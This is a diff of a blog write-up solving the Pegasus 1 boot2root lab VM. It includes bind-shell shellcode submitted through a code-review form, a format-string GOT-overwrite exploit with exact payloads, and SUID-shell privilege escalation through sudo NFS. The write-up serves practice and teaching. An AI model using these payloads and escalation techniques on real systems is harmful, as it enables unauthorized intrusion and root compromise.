@@ -8,13 +8,14 @@ categories:
 comments: true
 date: 2014-12-23T08:29:49Z
 title: hoof to root ? - solving pegasus 1
-url: /2014/12/23/hoof-to-root-solving-pegasus-1/
 ---
 
 ## introduction
 [Pegasus 1](https://www.vulnhub.com/entry/pegasus-1,109/) is a boot2root hosted on [VulnHub](https://www.vulnhub.com/) built by [@TheKnapsy](https://twitter.com/theknapsy). He wrote a [blogpost](http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/) about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
 
-{% img right https://i.imgur.com/PI4O7Dp.png %} Having recently played in the [Offsec Playground](https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/) a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson... _again_. You will see this in the **my_first** section.
+{{< figure src="/images/pegasus_logo.png" >}}
+
+Having recently played in the [Offsec Playground](https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/) a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson... _again_. You will see this in the **my_first** section.
 
 Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
 
@@ -50,11 +51,11 @@ Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
 ## stomping some hoofs with pegasus
 Browsing to http://192.168.56.101:8088/, we are presented with a picture of Pegasus:
 
-{% img https://i.imgur.com/Z0XYRY8.jpg %}
+{{< figure src="/images/pegasus_web.png" >}}
 
 I manually tried to browse to things like `robots.txt` etc, but everything responded with the same image. This was until I decided to browse to `index.php`, in an attempt to check that the web server is configured to serve PHP content:
 
-{% img https://i.imgur.com/svwUN3m.png %}
+{{< figure src="/images/pegasus_nginx_index.png" >}}
 
 So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, `.php` scripts would 404 correctly. With that in mind, it was time to reach for `wfuzz` to discover some more.
 
@@ -70,7 +71,7 @@ Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
 
 Total requests: 1660
 ==================================================================
-ID  Response   Lines      Word         Chars          Request    
+ID  Response   Lines      Word         Chars          Request
 ==================================================================
 
 01426:  C=200      0 L         4 W       19 Ch    " - submit"
@@ -78,13 +79,13 @@ ID  Response   Lines      Word         Chars          Request
 
 And we have a HTTP 200 response for `submit.php`. So, I browsed to http://192.168.56.101:8088/submit.php:
 
-{% img https://i.imgur.com/Ld1KzkR.png %}
+{{< figure src="/images/pegasus_submit.png" >}}
 
 Well that isn't exactly useful. I played a little with the `submit.php` by sending a POST with some `--data`, but nothing useful came of it. Almost everything came back with `No data to process`.
 
 Admittedly, this was my first hurdle. I was thinking if there is a `submit.php`, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I'll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. `wfuzz` was working with `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`, when finally I get a HTTP 200 for `codereview.php`.
 
-{% img https://i.imgur.com/wYpHVWE.png %}
+{{< figure src="/images/pegasus_code_review.png" >}}
 
 ## pwning mike
 So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data `code` to the previously found `submit.php`.
@@ -95,7 +96,7 @@ PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, es
 
 Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to `system()` in it:
 
-{% img https://i.imgur.com/IVmBaAA.png %}
+{{< figure src="/images/pegasus_code_review_security.png" >}}
 
 Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to [system](http://php.net/manual/en/function.system.php), or C due to its [system](http://linux.die.net/man/3/system). Obviously though, `system()` is being filtered out, so I would need an alternative.
 
@@ -103,13 +104,13 @@ _insert fade to black_
 
 _CAPTION: many hours later_
 
-After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of 
+After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of
 
 ```c
 #include<stdio.h>
 
 // msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
-unsigned char buf[] = 
+unsigned char buf[] =
 "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
 "\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
 "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
@@ -226,7 +227,7 @@ As was hoped for, a shell as `mike`. I quickly generated a new ssh key pair for 
 
 ```bash
 # first I cat the public key so that I can copy it
-root@kali:~# cat pegasus.pub 
+root@kali:~# cat pegasus.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali
 
 # next I connect to the bind shell listener and move to Mikes .shh directory
@@ -353,7 +354,7 @@ index 0000000..39c0182
 Nice! We have a file `main.c` that was added. I copied the diff and saved it to `init.patch`, and then ran the patch:
 
 ```bash
-root@kali:~# patch -p1 < init.diff 
+root@kali:~# patch -p1 < init.diff
 patching file main.c
 ```
 
@@ -367,14 +368,14 @@ index 39c0182..b6b2ed4 100644
 --- a/main.c
 +++ b/main.c
 @@ -8,7 +8,7 @@ int quit();
- 
+
 [... snip ...]
-+        
++
          printf("Enter second number: ");
          if (fgets(numberB, sizeof numberB, stdin) != NULL)
          {
 -            int numA = strtol(numberA, &err_check, 10);
-             int numB = strtol(numberB, &err_check, 10); 
+             int numB = strtol(numberB, &err_check, 10);
              if (*err_check != '\n')
              {
 -                printf("Error details: ");
@@ -395,7 +396,7 @@ I quickly realized that the `main.c` file I got out of the git repository, was t
 First, it was time to confirm my suspicion of a format string vulnerability:
 
 ```bash
-mike@pegasus:~$ ./my_first 
+mike@pegasus:~$ ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -407,13 +408,11 @@ Select your tool:
 Selection: 1
 
 Enter first number: 1
-Enter second number: %x    
+Enter second number: %x
 Error details: bf96cbec
 
 Selection:
 ```
-
-{% img https://i.imgur.com/xrrpxFZ.png %}
 
 I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.
 
@@ -433,7 +432,7 @@ As I had seen the source code, it was easy to formulate a plan for the exploit. 
 We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the `./my_first` binary to sample a successful run:
 
 ```bash
-mike@pegasus:~$ printf '1\n1\n1\n4\n' | ./my_first 
+mike@pegasus:~$ printf '1\n1\n1\n4\n' | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -442,17 +441,17 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Result: 1 + 1 = 2
 
-Selection: 
+Selection:
 Goodbye!
 ```
 
 Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A's, and then incrementing the format string arguments by 1 until we can find the 4 A's. In my case, I will be formatting them as hex with `%x`, so I am searching for `41414141`. The format string will therefore start as `AAAA.0x%s`. Note that in the below example we are using 2 x percentages (2 x '%') as it needs to be escaped in the shell:
 
 ```bash
-mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x\n4\n' | ./my_first 
+mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x\n4\n' | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -461,10 +460,10 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: AAAA.0xbff5321c
 
-Selection: 
+Selection:
 Goodbye!
 ```
 
@@ -472,7 +471,7 @@ And we have the output of `AAAA.0xbff5321c`. Yay :)
 Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A's:
 
 ```bash
-mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n' | ./my_first 
+mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n' | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -481,10 +480,10 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141
 
-Selection: 
+Selection:
 Goodbye!
 mike@pegasus:~$
 ```
@@ -492,7 +491,7 @@ mike@pegasus:~$
 So, using direct parameter access in the format string, we can reference parameter 8 directly:
 
 ```bash
-mike@pegasus:~$ printf '1\n1\nAAAA.0x%%8$x\n4\n' | ./my_first 
+mike@pegasus:~$ printf '1\n1\nAAAA.0x%%8$x\n4\n' | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -501,10 +500,10 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: AAAA.0x41414141
 
-Selection: 
+Selection:
 Goodbye!
 mike@pegasus:~$
 ```
@@ -514,12 +513,12 @@ Parameter 8 in the format string is the start of the section on the stack we can
 Now we will move on to making use of the `%n` format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for `printf()` occurs ofc! Lets dump the GOT for `./my_first`, and determine where it will go look for `printf()`:
 
 ```bash
-mike@pegasus:~$ objdump -R ./my_first 
+mike@pegasus:~$ objdump -R ./my_first
 
 ./my_first:     file format elf32-i386
 
 DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
+OFFSET   TYPE              VALUE
 08049bec R_386_GLOB_DAT    __gmon_start__
 08049c20 R_386_COPY        stdin
 08049bfc R_386_JUMP_SLOT   printf
@@ -547,7 +546,7 @@ With the ASLR problem out of the way, lets leak the address of `system()`:
 
 ```bash
 # fire up gdb
-mike@pegasus:~$ gdb -q ./my_first 
+mike@pegasus:~$ gdb -q ./my_first
 Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
 
 # set a break point as we enter main()
@@ -556,7 +555,7 @@ Breakpoint 1 at 0x804850f
 
 # run the binary
 (gdb) r
-Starting program: /home/mike/my_first 
+Starting program: /home/mike/my_first
 
 Breakpoint 1, 0x0804850f in main ()
 
@@ -580,7 +579,7 @@ t: data
 
 # then, in gdb, we will grab the output of the new file called
 # t, and redirect it as input to my_first
-mike@pegasus:~$ gdb -q ./my_first 
+mike@pegasus:~$ gdb -q ./my_first
 Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
 
 # leak the current address that GOT points to for printf()
@@ -598,7 +597,7 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: ��
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -630,7 +629,7 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: ����
 
 [... snip ...]
@@ -659,18 +658,18 @@ I quickly compiled some C wrapper code to prepare a shell and ran the exploit.
 ```bash
 # Prep Selection: to make a SUID shell for john
 # and modify PATH
-mike@pegasus:~$ cat tojohn.c 
+mike@pegasus:~$ cat tojohn.c
 #include <stdio.h>
 int main()
 {
     system("cp /bin/sh /tmp/tojohn");
     system("chmod 4777 /tmp/tojohn");
 }
-mike@pegasus:~$ gcc tojohn.c -o "Selection:" 
+mike@pegasus:~$ gcc tojohn.c -o "Selection:"
 mike@pegasus:~$ export PATH=/home/mike/:$PATH
 
 # run the exploit...
-mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' | ./my_first 
+mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' | ./my_first
 WELCOME TO MY FIRST TEST PROGRAM
 --------------------------------
 Select your tool:
@@ -679,7 +678,7 @@ Select your tool:
 [3] String reverse
 [4] Exit
 
-Selection: 
+Selection:
 Enter first number: Enter second number: Error details: ����
 
                      10
@@ -697,7 +696,7 @@ mike@pegasus:~$
 We have a new file `tojohn` in `/tmp` :D
 
 ```bash
-mike@pegasus:~$ /tmp/tojohn 
+mike@pegasus:~$ /tmp/tojohn
 $ id
 uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
 ```
@@ -717,8 +716,8 @@ User john may run the following commands on this host:
 john@pegasus:~$ sudo nfs
 Usage: nfs [start|stop]
 john@pegasus:~$ sudo nfs start
- * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ] 
- * Starting NFS kernel daemon                                                                                                                                                     [ OK ] 
+ * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ]
+ * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
 john@pegasus:~$
 ```
 
@@ -734,7 +733,7 @@ root@kali:~# mount 192.168.56.101:/opt/nfs nfs
 ... prepped a SUID shell ...
 
 ```bash
-root@kali:~/Desktop/pegasus/nfs# cat shell.c 
+root@kali:~/Desktop/pegasus/nfs# cat shell.c
 #include <stdio.h>
 
 int main()
@@ -756,7 +755,7 @@ drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
 ... and rooted Pegasus :)
 
 ```bash
-john@pegasus:~$ /opt/nfs/shell 
+john@pegasus:~$ /opt/nfs/shell
 # id
 uid=0(root) gid=0(root) groups=0(root),1000(john)
 ```
@@ -766,10 +765,10 @@ uid=0(root) gid=0(root) groups=0(root),1000(john)
 ```text
 # cat /root/flag
                ,
-               |`\        
-              /'_/_   
-            ,'_/\_/\_                       ,   
-          ,'_/\'_\_,/_                    ,'| 
+               |`\
+              /'_/_
+            ,'_/\_/\_                       ,
+          ,'_/\'_\_,/_                    ,'|
         ,'_/\_'_ \_ \_/                _,-'_/
       ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
     ,' /_\ _'_ \_ \'_,/       __,-'<_,' _,\_,/      known creatures in Greek
@@ -784,12 +783,12 @@ uid=0(root) gid=0(root) groups=0(root),1000(john)
        \_)   >        `\_                           It was a hardware clone of
             /  `,      |`\_                         the Nintendo Famicom.
            /    \     / \ `\
-          /   __/|   /  /  `\  
-         (`  (   (` (_  \   /   
-         /  ,/    |  /  /   \   
-        / ,/      | /   \   `\_ 
+          /   __/|   /  /  `\
+         (`  (   (` (_  \   /
+         /  ,/    |  /  /   \
+        / ,/      | /   \   `\_
       _/_/        |/    /__/,_/
-     /_(         /_( 
+     /_(         /_(
 
 
 CONGRATULATIONS! You made it :)
